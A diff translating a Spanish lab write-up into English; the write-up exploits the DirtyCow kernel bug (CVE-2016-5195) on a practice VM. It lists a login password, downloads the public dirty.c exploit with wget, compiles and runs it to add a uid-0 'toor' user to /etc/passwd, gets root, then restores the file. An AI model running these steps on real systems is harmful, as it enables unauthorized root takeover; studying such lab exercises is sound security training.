@@ -1,30 +1,30 @@
 # Writeup 2 - Vulnerabilidad DirtyCow
 
-## Índice:
+## Index:
 
-- [¿Qué es DirtyCow?](#qué-es-dirtycow)
-- [1. Verificamos que el kernel es vulnerable.](#1-verificamos-que-el-kernel-es-vulnerable)
-- [2. Búsqueda GCC](#2-búsqueda-gcc)
-- [3. Obtención del exploit](#3-obtención-del-exploit)
-- [4. Descarga e instalación DirtyCow](#4-descarga-e-instalación-dirtycow)
-- [5. Ejecutamos el Exploit](#5-ejecutamos-el-exploit)
-- [6. Restauramos](#6-restauramos)
+- [What is DirtyCow?](#what-is-dirtycow)
+- [1. We verified that the kernel is vulnerable.](#1-we-verified-that-the-kernel-is-vulnerable)
+- [2. GCC Search](#2-gcc-search)
+- [3. Obtaining the exploit](#3-obtaining-the-exploit)
+- [4. Download and install DirtyCow](#4-download-and-install-dirtycow)
+- [5. We execute the Exploit](#5-we-execute-the-exploit)
+- [6. We restored](#6-we-restored)
 
-## ¿Qué es DirtyCow?
+## What is DirtyCow?
 
-**DirtyCow (CVE-2016-5195)** es una vulnerabilidad del kernel Linux descubierta en 2016. Su nombre viene de *"Dirty Copy-On-Write"*.
+**DirtyCow (CVE-2016-5195)** is a Linux kernel vulnerability discovered in 2016. Its name comes from *"Dirty Copy-On-Write."*
 
-Es un bug en el mecanismo que usa el kernel para gestionar la memoria cuando múltiples procesos acceden al mismo recurso.
+It's a bug in the mechanism the kernel uses to manage memory when multiple processes access the same resource.
 
-Esto quiere decir, que permite a un usuario **sin privilegios** escribir en zonas de memoria de solo lectura, incluyendo archivos del sistema como **`/etc/passwd`** Y nos permitirá escalar privilegios a root.
+This means it allows an **unprivileged user** to write to read-only memory areas, including system files like **/etc/passwd**, and potentially escalate privileges to root.
 
-La VM corre un kernel antiguo de 2015 por lo tanto:  **Es vulnerable**.
+The VM is running an older kernel from 2015, therefore it is vulnerable.
 
-## Explotación
+## Exploitation
 
-## 1. Verificamos que el kernel es vulnerable.
+## 1. We verified that the kernel is vulnerable.
 
-Nos conectamospor ssh como el usuario `Laurie` y verificamos si el kernel es vulnerable:
+We connect via ssh as the user `Laurie` and check if the kernel is vulnerable:
 
 - password: 330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
 
@@ -52,11 +52,11 @@ Linux BornToSecHackMe 3.2.0-91-generic-pae #129-Ubuntu SMP Wed Sep 9 11:27:47 UT
 laurie@BornToSecHackMe:~$ 
 ```
 
-**kernel 3.2.0-91** de 2015. Es vulnerable a DirtyCow sin ninguna duda.
+**kernel 3.2.0-91** from 2015. It is undoubtedly vulnerable to DirtyCow.
 
-## 2. Búsqueda GCC
+## 2. GCC Search
 
-Ahora vamos a ver si `gcc` está disponible en la VM:
+Now let's see if `gcc` is available on the VM:
 ```bash
 laurie@BornToSecHackMe:~$ which gcc
 /usr/bin/gcc
@@ -69,31 +69,31 @@ warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 laurie@BornToSecHackMe:~$ 
 ```
 
-**gcc disponible** -> version `gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3`
+**gcc available** -> version `gcc (Ubuntu/Linaro 4.6.3-1ubuntu5) 4.6.3`
 
-Por lo tanto ya tenemos todo lo que necesitamos.
+Therefore, we already have everything we need.
 
-## 3. Obtención del exploit
+## 3. Obtaining the exploit
 
-**DirtyCow** tiene varios exploits públicos. El más común para escalada de privilegios modifica `/etc/passwd` directamente para añadir un nuevo usuario con uid=0.
+**DirtyCow** has several publicly available exploits. The most common one for privilege escalation directly modifies `/etc/passwd` to add a new user with uid=0.
 
-Buscamos en internet el exploit `dirty.c`. La busqueda clave es:
+We searched the internet for the exploit `dirty.c`. The key search term is:
 ```text
 dirtycow exploit dirty.c github
 ```
 
 ![DirtyCow](img/DirtyCow_01.png)
 
-**Enlace repo de GitHub: https://github.com/firefart/dirtycow/blob/master/dirty.c**
+**GitHub repo link: https://github.com/firefart/dirtycow/blob/master/dirty.c**
 
-Este que hemos encontrado es el exploit más conocido y documentado de DirtyCow. Es el de `firefart` y es perfecto para este caso porque:
+This exploit we've found is the most well-known and documented DirtyCow exploit. It's the `firefart` exploit, and it's perfect for this case because:
 
-- Modifica /etc/passwd para crear un usuario toor con uid=0
-- Hace backup automático en /tmp/passwd.bak
-- Se compila con un solo comando
-- Es reversible. Podemos restaurar `/etc/passwd` después
+- It modifies `/etc/passwd` to create a user named `toor` with `uid=0`
+- It automatically backs up to `/tmp/passwd.bak`
+- It compiles with a single command
+- It's reversible. We can restore `/etc/passwd` afterward.
 
-Una vez que lo hemos encontrado necesiytamos transferirlo a la VM y para ellos comprobamos si disponemos de `wget` o `curl` para descarfarlo directamente:
+Once we've found it, we need to transfer it to the VM. To do this, we check if we have `wget` or `curl` available to download it directly:
 
 ```bash
 laurie@BornToSecHackMe:~$ which wget
@@ -103,9 +103,9 @@ laurie@BornToSecHackMe:~$ which curl
 laurie@BornToSecHackMe:~$ 
 ```
 
-## 4. Descarga e instalación DirtyCow
+## 4. Download and install DirtyCow
 
-Ahora lo descargamos directaente en la VM:
+Now we download it directly to the VM:
 ```text
 wget --no-check-certificate https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -O /tmp/dirty.c
 ```
@@ -126,19 +126,19 @@ Saving to: `/tmp/dirty.c'
 2026-04-27 19:06:07 (22.3 MB/s) - `/tmp/dirty.c' saved [4795/4795]
 ```
 
-Una vez descargado lo compilamos.
+Once downloaded, we compile it.
 ```bash
 gcc -pthread /tmp/dirty.c -o /tmp/dirty -lcrypt
 ```
 
-## 5. Ejecutamos el Exploit
+## 5. We execute the Exploit
 
-Hacto seguido lo ejecutamos con una contraseña nueva.
+Next, we run it with a new password.
 ```bash
 /tmp/dirty toor
 ```
 
-Esperamos a que termine. Esta operación suele tardar varios minutos dependiedo de la carga del sistema.
+We wait for it to finish. This operation usually takes several minutes depending on the system load.
 ```bash
 laurie@BornToSecHackMe:~$ /tmp/dirty toor
 /etc/passwd successfully backed up to /tmp/passwd.bak
@@ -163,9 +163,9 @@ DON'T FORGET TO RESTORE! $ mv /tmp/passwd.bak /etc/passwd
 laurie@BornToSecHackMe:~$ 
 ```
 
-Una vezi que ha terminado comprobamos si hemos tenido éxito y escalamos privilegios:
+Once it's finished, we check if we've been successful and escalate privileges:
 
-- Usuario: toor
+- Username: toor
 - Password: toor
 ```bash
 laurie@BornToSecHackMe:~$ su toor
@@ -176,26 +176,26 @@ toor@BornToSecHackMe:/home/laurie# id
 uid=0(toor) gid=0(root) groups=0(root)
 toor@BornToSecHackMe:/home/laurie# 
 ```
-## **ROOT conseguido con DirtyCow. uid=0 (privilegios de root).**
+## **ROOT obtained with DirtyCow. uid=0 (root privileges).**
 
-## 6. Restauramos
+## 6. We restored
 
-Ahora restaura /etc/passwd tal y como hemos descritp en el exploit:
+Now restore /etc/passwd as described in the exploit:
 ```bash
 toor@BornToSecHackMe:/home/laurie# mv /tmp/passwd.bak /etc/passwd
 toor@BornToSecHackMe:/home/laurie# 
 ```
 
-Y `/etc/passwd` queda restaurado y comprobamos que así es:
+And `/etc/passwd` is restored and we verify that this is the case:
 ```bash
 toor@BornToSecHackMe:/home/laurie# cat /etc/passwd | grep toor
 toor@BornToSecHackMe:/home/laurie# 
 ```
-Vemos que solo aparecen las líneas originales.
+We see that only the original lines appear.
 ```bash
 toor@BornToSecHackMe:/home/laurie# grep root /etc/passwd
 root:x:0:0:root:/root:/bin/bash
 ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
 ```
 
-Si ahora intentamos hacer `su toor` de nuevo en una nueva sesión ya no funcionará.
+If we now try to do `su toor` again in a new session, it will no longer work.
